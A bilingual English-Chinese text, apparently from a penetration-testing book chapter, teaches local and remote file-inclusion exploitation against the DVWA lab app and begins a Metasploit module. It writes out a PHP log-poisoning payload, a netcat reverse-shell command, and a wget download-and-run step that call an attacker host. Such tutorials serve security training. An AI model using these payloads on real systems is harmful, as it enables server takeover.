- en: Exploit Development
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞开发
- en: In this chapter, we are are going to explore **exploit development**. We are
    going to understand how we can use Python to develop custom exploits. Although
    our main focus will be on developing exploits in Python, we will also see how
    we can develop exploits in Ruby to extend the capabilities of the Metasploit framework.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将探讨**利用程序开发**。我们将了解如何使用Python开发自定义利用程序。虽然我们的主要重点将是在Python中开发利用程序，但我们还将看到如何使用Ruby开发利用程序，以扩展Metasploit框架的功能。
- en: An exploit is nothing but a piece of code, written to exploit a vulnerability
    so that the same piece of code can be reused in different environments. The objective
    of writing an exploit is to ensure that the code is stable and that it will give
    the attacker the control they desire. It should be noted that an exploit is developed
    for a specific kind of vulnerability. It's very important to first understand
    the vulnerability and the manual steps required to exploit it. Once we have a
    clear understanding of this, we can proceed to automate the whole process and
    develop an exploit.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 利用程序只是一段代码，编写以利用漏洞，以便可以在不同环境中重用相同的代码。编写利用程序的目标是确保代码稳定，并且将给予攻击者他们所需的控制。应该注意，利用程序是针对特定类型的漏洞开发的。首先了解漏洞和利用它所需的手动步骤非常重要。一旦我们对此有清晰的理解，我们就可以继续自动化整个过程并开发一个利用程序。
- en: 'The following topics will be covered in this chapter:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主题：
- en: Scripting exploits over web-based vulnerabilities.
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在基于Web的漏洞上编写脚本利用。
- en: Developing a Metasploit module to exploit a network service.
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 开发一个Metasploit模块来利用网络服务。
- en: Encoding shell codes to avoid detection.
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 编码shell代码以避免检测。
- en: Scripting exploits over web-based vulnerabilities
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在基于Web的漏洞上编写脚本利用
- en: In this section, we are going to use an example of a **Damn Vulnerable Web Application**
    (**DVWA**). We will write an exploit for local and remote file inclusion and ensure
    that we get a reverse shell by executing the exploit. As we know, DVWA has many
    vulnerabilities, which include **Local File Inclusion** (**LFI**) and **Remote
    File Inclusion** (**RFI**).
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将使用**Damn Vulnerable Web Application** (**DVWA**)的一个示例。我们将为本地和远程文件包含编写一个利用程序，并确保通过执行利用程序获得反向shell。正如我们所知，DVWA有许多漏洞，其中包括**本地文件包含**
    (**LFI**)和**远程文件包含** (**RFI**)。
- en: Local file inclusion is a category of vulnerability typically found in PHP applications
    and is introduced by the improper usage of the `include()` and `require()` functions.
    The `include()` function is used to include a PHP module in the current PHP file
    from where it is invoked. There are occasions in which the developer takes the
    name of the file to be included as an input parameter from the web application,
    which can then be misused by attackers. An attacker can tweak the input parameter
    and can read system files on which they may not have access, such as `/etc/passwd`.
    The same vulnerability can be elevated to acquire a reverse shell from the server.
    If an attacker is able to read the log files of the server, which are usually
    present at the `/var/log/apache2/access.log` path, and an attacker sends a fake
    `GET` request such as `http://myvulsite.com?id=<?php shell_exec($_GET['cmd'])
    ?>`, the application will usually return an error message saying that the requested
    URL/resource doesn't exist. However, this will be logged in the `access.log` file
    of the server. With the help of LFI, if the attacker in the subsequent request
    tries to load the access log file as `http://myvulsite.com/admin.php?page=/var/log/appache2/access.log?cmd=ifconfig%00`,
    it shell loads the log file, which has a PHP code snippet. This will be executed
    by the PHP server. Since the attacker is specifying the CMD parameter, this will
    be executed at the shell, resulting in the execution of unintended code at the
    server. The RFI vulnerability is easier to execute. Let's put what we have discussed
    so far into action by starting the DVWA application and trying to exploit the
    LFI vulnerability manually.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 本地文件包含是一种通常在PHP应用程序中发现的漏洞类别，是由于对`include()`和`require()`函数的不正确使用而引入的。`include()`函数用于在当前PHP文件中包含一个PHP模块，从它被调用的地方。有时开发人员会从Web应用程序中以输入参数的形式获取要包含的文件的名称，这可能会被攻击者滥用。攻击者可以调整输入参数，并读取系统文件，这些文件可能是他们无法访问的，比如`/etc/passwd`。相同的漏洞可以被升级以从服务器获取反向shell。如果攻击者能够读取服务器的日志文件，通常位于`/var/log/apache2/access.log`路径下，并且攻击者发送一个伪造的`GET`请求，比如`http://myvulsite.com?id=<?php
    shell_exec($_GET['cmd']) ?>`，应用程序通常会返回一个错误消息，说请求的URL/资源不存在。然而，这将被记录在服务器的`access.log`文件中。借助LFI，如果攻击者在随后的请求中尝试加载访问日志文件，比如`http://myvulsite.com/admin.php?page=/var/log/appache2/access.log?cmd=ifconfig%00`，它会加载日志文件，其中包含一个PHP代码片段。这将由PHP服务器执行。由于攻击者正在指定CMD参数，这将在shell中执行，导致在服务器上执行意外的代码。RFI漏洞更容易执行。让我们通过启动DVWA应用程序并尝试手动利用LFI漏洞来将我们讨论过的内容付诸实践。
- en: It should be noted that we have already seen how to use Python to write an exploit
    for a network service in [Chapter 12](2239f168-c111-4fd7-a79c-8e39a8cb9aca.xhtml), *Reverse
    Engineering Windows Applications*, where we wrote a custom Python exploit to exploit
    the SLmail service. Refer to that chapter to refresh your knowledge of service-based
    exploit development targeting buffer overflow.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 应该注意，我们已经看到如何在[第12章](2239f168-c111-4fd7-a79c-8e39a8cb9aca.xhtml)中使用Python编写网络服务的利用程序，*逆向工程Windows应用程序*，在那里我们编写了一个自定义的Python利用程序来利用SLmail服务。请参考该章节，以刷新您对针对缓冲区溢出的基于服务的利用程序开发的知识。
- en: Manually executing an LFI exploit
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 手动执行LFI利用
- en: 'Let''s begin by starting the Apache server:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始启动Apache服务器：
- en: '[PRE0]'
  id: totrans-13
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'Let''s try to browse the application manually and see where the vulnerability
    lies:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们尝试手动浏览应用程序，看看漏洞在哪里：
- en: '![](img/22c584ef-a902-4881-b84e-011785536376.png)'
  id: totrans-15
  prefs: []
  type: TYPE_IMG
  zh: '![](img/22c584ef-a902-4881-b84e-011785536376.png)'
- en: 'The browsed URL in the preceding screen is `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=include.php`.
    As can be seen, the requested URL has a page parameter, which takes the page that
    is to be included as an argument. If we take a look at the source code of the
    application, we can see the implementation of the `include()` function as follows:'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 前面屏幕中浏览的URL是`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=include.php`。可以看到，请求的URL有一个page参数，它将要包含的页面作为参数。如果我们查看应用程序的源代码，我们可以看到`include()`函数的实现如下：
- en: '![](img/4251eb69-3f5b-4576-b281-a35dbac69266.png)'
  id: totrans-17
  prefs: []
  type: TYPE_IMG
  zh: '![](img/4251eb69-3f5b-4576-b281-a35dbac69266.png)'
- en: The preceding screenshot initializes the file variable to the parameter that
    is obtained in the `GET` request, without any filtering.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的截图将文件变量初始化为在`GET`请求中获得的参数，没有任何过滤。
- en: 'The next screenshot uses the same file variable under the `include()` function
    as follows:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个截图使用与`include()`函数下相同的文件变量如下：
- en: '![](img/8edcde7b-3482-447b-80e8-9a7927bc0b64.png)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8edcde7b-3482-447b-80e8-9a7927bc0b64.png)'
- en: As highlighted, the `include()` function includes whatever the value of the
    `$file` variable might be. Let's try to exploit this and read any system file
    to which we may not have access, such as `/etc/passwd`, by accessing the following
    URL: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/etc/passwd`
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 如上所示，`include()`函数包含`$file`变量的任何值。让我们尝试利用这一点，通过访问以下URL读取我们可能无法访问的任何系统文件，比如`/etc/passwd`：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/etc/passwd`
- en: '![](img/d2e9ffdb-422e-405e-bc5a-32de76e5524d.png)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d2e9ffdb-422e-405e-bc5a-32de76e5524d.png)'
- en: Let's now elevate the attack a little further and try to get a shell from the
    LFI vulnerability. Let's use `Netcat` to poison the log file for us to get the
    shell from the server.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们进一步升级攻击，尝试从LFI漏洞中获得shell。让我们使用`Netcat`来为我们毒害日志文件，以便从服务器获得shell。
- en: It should be noted that we should not try to poison the log files via the URL.
    Doing so will encode our payload to URL encoding, rendering the attack useless.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 应该注意的是，我们不应该尝试通过URL毒害日志文件。这样做将使我们的有效负载编码为URL编码，使攻击无效。
- en: 'Let''s first try to see the contents of the Apache log file and load it on
    our browser window with the URL at: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log`:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们首先尝试查看Apache日志文件的内容，并在我们的浏览器窗口中使用以下URL加载它：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log`：
- en: '![](img/7bb7967c-dc92-41d6-b24c-c8f020643e36.png)'
  id: totrans-26
  prefs: []
  type: TYPE_IMG
  zh: '![](img/7bb7967c-dc92-41d6-b24c-c8f020643e36.png)'
- en: 'As we can see from the preceding screenshot, the contents of the log file are
    displayed on the page. Now let''s go ahead and try to poison the log file using
    `netcat`. First, start Netcat as follows: `nc 192.168.1.102 80`. Once started,
    send the following command to the server: `http://192.168.1.102/dvwa?id=<?php
    echo shell_exec($_GET[''cmd'']);?>`'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，日志文件的内容显示在页面上。现在让我们继续尝试使用`netcat`毒害日志文件。首先，按以下方式启动Netcat：`nc 192.168.1.102
    80`。一旦启动，向服务器发送以下命令：`http://192.168.1.102/dvwa?id=<?php echo shell_exec($_GET['cmd']);?>`
- en: '![](img/d32a907e-459e-4a88-b7a9-14f67b5ce1d3.png)'
  id: totrans-28
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d32a907e-459e-4a88-b7a9-14f67b5ce1d3.png)'
- en: Bingo! We have now poisoned our log file. Let's now try to issue a command such
    as `ifconfig` to see if it will be executed. The URL we will browse will be as
    follows: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=ifconfig`.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 中了！我们现在毒害了我们的日志文件。现在让我们尝试发出诸如`ifconfig`之类的命令，看看是否会被执行。我们将浏览的URL如下：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=ifconfig`。
- en: 'Notice the `cmd` parameter. We are sending the `ifconfig` command, which will
    be invoked by the following line of code:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 注意`cmd`参数。我们发送`ifconfig`命令，该命令将由以下代码行调用：
- en: '`<?php echo shell_exec($_GET[''cmd'']);?>, translating to <?php echo shell_exec(ifconfig)?>`'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '`<?php echo shell_exec($_GET[''cmd'']);?>`，翻译为`<?php echo shell_exec(ifconfig)?>`'
- en: 'The highlighted area in the following screenshot shows that our command has
    been successfully executed:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的截图中突出显示的区域显示我们的命令已成功执行。
- en: '![](img/9735f03d-5ff3-45bc-9ccc-a0611ebbab1a.png)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![](img/9735f03d-5ff3-45bc-9ccc-a0611ebbab1a.png)'
- en: Let's now try to get a reverse shell from the same `cmd` parameter. We will
    use `netcat` to get the reverse shell. If netcat is not installed on the server,
    we can also use Python to get the shell. Let's see both in action.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们尝试从相同的`cmd`参数中获得一个反向shell。我们将使用`netcat`来获得反向shell。如果服务器上没有安装netcat，我们也可以使用Python来获得shell。让我们看看两者的效果。
- en: Reverse shell with Netcat
  id: totrans-35
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Netcat进行反向shell
- en: 'The URL and command in this case will be as follows: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=nc
    -e /bin/sh 192.168.1.102 4444`.'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，URL和命令将如下：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=nc
    -e /bin/sh 192.168.1.102 4444`。
- en: 'We also need to set up a `netcat` listener that will listen to the incoming
    connections on port `4444`. Let''s do this by executing the `nc -nlvp 4444` command on
    a different Terminal. Now, browse the URL and see whether we get the shell:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还需要设置一个`netcat`监听器，它将在端口`4444`上监听传入的连接。让我们在另一个终端上执行`nc -nlvp 4444`命令。现在，浏览URL，看看我们是否得到了shell：
- en: '![](img/6cb31672-8088-4619-8644-f3f2fd021296.png)'
  id: totrans-38
  prefs: []
  type: TYPE_IMG
  zh: '![](img/6cb31672-8088-4619-8644-f3f2fd021296.png)'
- en: 'After browsing this URL, let''s try to see our spawned `netcat` listener to
    see whether we get the shell:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 浏览此URL后，让我们尝试查看我们生成的`netcat`监听器，看看我们是否获得了shell：
- en: '![](img/ac74a96b-fa99-40f3-b85e-5b63cc020431.png)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ac74a96b-fa99-40f3-b85e-5b63cc020431.png)'
- en: As can be verified, we got a low privileged shell, `www-data`.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 可以验证，我们得到了一个低权限的shell，`www-data`。
- en: Reverse shell with Python
  id: totrans-42
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Python进行反向shell
- en: 'Now, let''s assume that Netcat is not installed on the server. We will make
    use of Python to obtain the shell. As the underlying server is Linux based, by
    default, Python would be installed on it. We would therefore modify our exploit
    command as follows:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，假设服务器上没有安装Netcat。我们将使用Python来获得shell。由于底层服务器是基于Linux的，默认情况下会安装Python。因此，我们将修改我们的利用命令如下：
- en: '`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: '`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`'
- en: 'As can be seen, we will create an exploit file written in Python and will serve
    it on our attacker machine. Since, for the current example, both the attacker
    and the victim are on same machine, the URL is `http://192.168.1.102`. The contents
    of the exploit file are shown here:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 可以看到，我们将创建一个用Python编写的漏洞利用文件，并在攻击者机器上提供服务。由于在当前示例中，攻击者和受害者都在同一台机器上，URL是`http://192.168.1.102`。漏洞利用文件的内容如下所示：
- en: '![](img/7c01434c-6c79-4696-a69a-3724bb041b29.png)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![](img/7c01434c-6c79-4696-a69a-3724bb041b29.png)'
- en: 'Downloading the exploit file will complete the first step of our exploitation
    process. The second step will be to execute it and get back the listener. This
    can be executed by accessing the following URL: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 下载漏洞利用文件将完成我们利用过程的第一步。第二步将是执行它并获取回监听器。这可以通过访问以下URL来执行：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`
- en: 'Let''s take a look at this in action:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看这个实际操作：
- en: 'Download and save the Python exploit in the `/tmp` folder: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在`/tmp`文件夹中下载并保存Python漏洞利用程序：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`
- en: 'Validate whether it has saved successfully:'
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 验证是否已成功保存：
- en: '![](img/30c5c1f9-b9d3-44b6-b144-48fc116ae178.png)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![](img/30c5c1f9-b9d3-44b6-b144-48fc116ae178.png)'
- en: 'Start the `netcat` listener on `444`: `nc -nlvp 4444`.'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在`444`上启动`netcat`监听器：`nc -nlvp 4444`。
- en: 'Launch the command that invokes the `exp.py` script to connect back to the
    attacker box:  `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`.'
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动调用`exp.py`脚本连接回攻击者主机的命令：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`。
- en: 'Let''s now see whether our listener has obtained the shell:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看我们的监听器是否已经获得了shell：
- en: '![](img/67be60de-978e-41d0-9b6e-ca8163c01804.png)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![](img/67be60de-978e-41d0-9b6e-ca8163c01804.png)'
- en: As we can see from the preceding screenshot, we have successfully obtained the
    shell.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 从前面的截图中可以看到，我们已成功获得了shell。
- en: Exploit development (LFI + RFI)
  id: totrans-57
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞利用开发（LFI + RFI）
- en: Up until now, we have studied how to exploit the LFI vulnerability manually.
    Let's go ahead and try to develop a generic exploit that will exploit the LFI
    vulnerability for this and other identical applications. In this section, we will
    see how to write an awesome exploit that will exploit both the RFI and the LFI
    vulnerabilities in the DVWA application. Although this exploit has been written
    for the DVWA application, I have tried to make it generic. With certain tweaks,
    we can try it with other applications as well that may have LFI and RFI vulnerabilities.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经学习了如何手动利用LFI漏洞。让我们继续尝试开发一个通用的漏洞利用程序，它将利用LFI漏洞以及其他相同的应用程序。在本节中，我们将看到如何编写一个了不起的漏洞利用程序，它将利用DVWA应用程序中的RFI和LFI漏洞。尽管这个漏洞利用程序是为DVWA应用程序编写的，但我尝试使它通用化。通过一些调整，我们也可以尝试将其用于其他可能存在LFI和RFI漏洞的应用程序。
- en: 'Let''s install the prerequisites:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们安装前提条件：
- en: '[PRE1]'
  id: totrans-60
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'After installing `phantomjs`, we need to execute the following on the console: **`unset
    QT_QPA_PLATFORM`**. This is used to handle the error thrown by `phantomjs` when
    it is used on Ubuntu version 16.04, which is as follows: `Message: Service phantomjs
    unexpectedly exited. Status code was: -6`.'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '安装`phantomjs`后，我们需要在控制台上执行以下命令：**`unset QT_QPA_PLATFORM`**。这是用于处理`phantomjs`在Ubuntu
    16.04版本上使用时抛出的错误，错误信息如下：`Message: Service phantomjs unexpectedly exited. Status
    code was: -6`。'
- en: LFI/RFI exploit code
  id: totrans-62
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: LFI/RFI漏洞利用代码
- en: 'Let''s take a look at the following code that will exploit LFI/RFI vulnerabilities
    in DVWA:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看下面的代码，它将利用DVWA中的LFI/RFI漏洞：
- en: '![](img/fa1254bb-ed18-4d07-a749-72f6d49e6574.png)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![](img/fa1254bb-ed18-4d07-a749-72f6d49e6574.png)'
- en: 'In the following code snippet, lines 65-74 check whether the application to
    be tested requires authentication for the vulnerability to be exploited:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的代码片段中，第65至74行检查要测试的应用程序是否需要身份验证才能利用漏洞：
- en: '![](img/58e6d1f1-3be7-489c-b957-61c30bdb0d7b.png)'
  id: totrans-66
  prefs: []
  type: TYPE_IMG
  zh: '![](img/58e6d1f1-3be7-489c-b957-61c30bdb0d7b.png)'
- en: 'If authentication is required, then the cookie values supplied from the user
    are set at a Selenium Python browser/driver, and the URL is invoked with cookie
    data to have a valid session:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 如果需要身份验证，则从用户提供的cookie值设置在Selenium Python浏览器/驱动程序中，并使用cookie数据调用URL以获得有效会话：
- en: '![](img/004a5612-24a9-4a1f-b394-e8ebc59fa3e1.png)'
  id: totrans-68
  prefs: []
  type: TYPE_IMG
  zh: '![](img/004a5612-24a9-4a1f-b394-e8ebc59fa3e1.png)'
- en: 'The lines between 90 and 105 are used to control the LFI vulnerability workflow.
    This section has a sequence of steps that we perform manually. In line 91, we
    prepare the malicious URL that will poison the log file and place a PHP code snippet
    in the `access.log` file. In line 93, we place that malicious URL in a text file
    called `exp.txt` and we ask Netcat to take an input from that file. Remember that
    we used `netcat` when we poisoned the `access.log` file previously; the same operation
    will be repeated here. In line 97, we ask `netcat` to connect to the victim server
    on port `80`, take an input from the `exp.txt` file, and send that input to the
    victim server, so that the log will be poisoned. We do this by creating a bash
    script, `exp.sh`. In line 99, we invoke this bash script, which will in turn invoke
    `netcat` and cause `netcat` to take an input from the `evil.txt` file, thereby
    poisoning the log. In line 103, we set up the exploit URL, the one that we will
    make our simulated selenium browser visit, for it to give us a reverse shell:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 第90至105行用于控制LFI漏洞的工作流程。这一部分有一系列我们手动执行的步骤。在第91行，我们准备了一个恶意URL，将毒害日志文件并在`access.log`文件中放置一个PHP代码片段。在第93行，我们将该恶意URL放入一个名为`exp.txt`的文本文件中，并要求Netcat从该文件中获取输入。请记住，我们在之前毒害`access.log`文件时使用了`netcat`；这里将重复相同的操作。在第97行，我们要求`netcat`连接到受害者服务器的`80`端口，从`exp.txt`文件中获取输入，并将该输入发送到受害者服务器，以便毒害日志。我们通过创建一个bash脚本`exp.sh`来实现这一点。在第99行，我们调用这个bash脚本，它将调用`netcat`并导致`netcat`从`evil.txt`文件中获取输入，从而毒害日志。在第103行，我们设置了漏洞利用URL，我们将让我们模拟的selenium浏览器访问，以便给我们一个反向shell：
- en: '![](img/ca58e9a5-7ce5-4b93-b1ad-b94a472b1cf0.png)'
  id: totrans-70
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ca58e9a5-7ce5-4b93-b1ad-b94a472b1cf0.png)'
- en: In line 115, we are invoking a process that will cause the browser to make a
    request to a vulnerable page with the payload using the `start()` method of that
    process, under line 116\. But before actually accessing the exploit, we need to
    set up a netcat listener. Line 119 sets up a Netcat listener and we introduce
    a time delay of five seconds, as can be seen in the definition of the process
    method `send_exp()`, giving time for netcat to start. Once started, the payload
    is delivered with the `send_exp()` method, under line 61\. If everything goes
    well, our listener gets the shell.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 在第115行，我们正在调用一个进程，该进程将使浏览器使用`start()`方法向一个带有有效载荷的易受攻击页面发出请求，在第116行之下。但在实际访问利用之前，我们需要设置一个netcat监听器。第119行设置了一个Netcat监听器，并且我们在`send_exp()`方法的定义中引入了五秒的时间延迟，给netcat启动的时间。一旦启动，有效载荷将通过`send_exp()`方法在第61行之下传递。如果一切顺利，我们的监听器将获得shell。
- en: The lines 107-113, handle the RFI part of the vulnerability. To exploit the
    RFI, we need to have an evil file created at our attacker machine, `evil.txt`,
    which will deliver the PHP payload. Once created, we need to place it in `/var/www/html/evil.txt`.
    Then, we need to start the Apache server and update the payload delivery URL to
    the address of the RFI. Finally, with the `send_exp()` method, we deliver our
    payload and then start the netcat listener.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 107-113行处理漏洞的RFI部分。要利用RFI，我们需要在攻击者机器上创建一个名为`evil.txt`的恶意文件，它将传递PHP有效载荷。创建后，我们需要将它放在`/var/www/html/evil.txt`中。然后，我们需要启动Apache服务器并将有效载荷传递URL更新为RFI的地址。最后，使用`send_exp()`方法，我们传递我们的有效载荷，然后启动netcat监听器。
- en: 'The preceding code works for both LFI and RFI vulnerabilities. The code given
    takes the user parameters in the following order:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 上述代码适用于LFI和RFI漏洞。给定的代码按以下顺序获取用户参数：
- en: '[PRE2]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Executing the LFI exploit
  id: totrans-75
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 执行LFI利用
- en: 'To execute and exploit the LFI vulnerability, we will pass the following parameters
    to the script:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 要执行和利用LFI漏洞，我们将向脚本传递以下参数：
- en: '[PRE3]'
  id: totrans-77
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The preceding command would produce the output, as shown in the following screenshot:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令将产生如下截图所示的输出：
- en: '![](img/0a149bad-cf5b-4443-9498-5362a47481b9.png)![](img/f55804f0-eee1-4ada-9e80-3ba646eadbe7.png)'
  id: totrans-79
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0a149bad-cf5b-4443-9498-5362a47481b9.png)![](img/f55804f0-eee1-4ada-9e80-3ba646eadbe7.png)'
- en: As can be seen, we have successfully obtained a low privileged shell of `www-data`.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 如图所示，我们成功获得了`www-data`的低权限shell。
- en: Executing the RFI exploit
  id: totrans-81
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 执行RFI利用
- en: 'To execute and exploit the RFI vulnerability, we will pass the following parameters
    to the script:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 执行和利用RFI漏洞，我们将向脚本传递以下参数：
- en: '[PRE4]'
  id: totrans-83
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'The preceding command would produce the output, as shown in the following screenshot:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令将产生如下截图所示的输出：
- en: '![](img/a18dd40a-9e5c-4566-89b0-4f45e5a734d6.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a18dd40a-9e5c-4566-89b0-4f45e5a734d6.png)'
- en: As we can see, we successfully obtained the shell for the RFI vulnerability
    as well.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 如我们所见，我们成功获得了RFI漏洞的shell。
- en: Developing a Metasploit module to exploit a network service
  id: totrans-87
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 开发一个Metasploit模块来利用网络服务
- en: 'In this section, we will see how to make a Metasploit exploit module to exploit
    a given vulnerability. In this case, we will focus on a buffer overflow vulnerability
    of a gaming application called *Crossfire*. For us to write custom Metasploit
    modules, we need to place them in a specific directory, because when we use the
    `use exploit /....` command in Metasploit, by default, the framework looks for
    the available modules in the default Metasploit exploits directory. If it doesn''t
    find the given exploit there, it then searches the extended modules directory,
    which is located at the following path: `/root/msf4/modules/exploits`. Let''s
    create the path and a custom directory. We''ll turn our Kali VM on and run the
    following commands:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将看到如何制作一个Metasploit利用模块来利用给定的漏洞。在这种情况下，我们将专注于一个名为Crossfire的游戏应用程序的缓冲区溢出漏洞。为了编写自定义的Metasploit模块，我们需要将它们放在特定的目录中，因为当我们在Metasploit中使用`use
    exploit /....`命令时，默认情况下，框架会在默认的Metasploit利用目录中查找可用的模块。如果它在那里找不到给定的利用，那么它会在扩展模块目录中搜索，该目录位于以下路径：`/root/msf4/modules/exploits`。让我们创建路径和一个自定义目录。我们将打开我们的Kali虚拟机并运行以下命令：
- en: '[PRE5]'
  id: totrans-89
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: The preceding command will create a file called `custom_cf` within the `/root/.msf4/modules/exploits/custom/cf` directory.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
